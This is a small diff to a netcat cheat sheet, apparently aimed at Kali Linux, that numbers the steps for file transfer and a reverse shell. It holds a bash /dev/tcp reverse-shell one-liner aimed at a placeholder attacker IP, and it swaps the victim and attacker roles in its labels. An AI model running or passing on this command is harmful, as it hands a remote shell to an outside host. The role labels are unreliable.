@@ -26,11 +26,11 @@ Recommended OS: Kali Linux
 - **Listen on port**:  `nc -lvp 1234`
 - **Connect to host (chat, etc.)**:  `nc <hostname or IP> 1234`
 - **Send file**:  
-  **Receiver opens port and preps redirect**:  `nc -l 12345 > received_file.txt`  
-  **Sender connects and redirects file to receiver ip**:  `nc <receiver_ip> 12345 < my_file.txt`
+  **1. Receiver opens port and preps redirect**:  `nc -l 12345 > received_file.txt`  
+  **2. Sender connects and redirects file to receiver ip**:  `nc <receiver_ip> 12345 < my_file.txt`
 - **Reverse Shell**:  
-  **Victim opens port**:  `nc -lvp 4444`  
-  **Attacker**:  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`  
+  **1. Victim opens port**:  `nc -lvp 4444`  
+  **2. Attacker**:  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`  
 
 ---
 
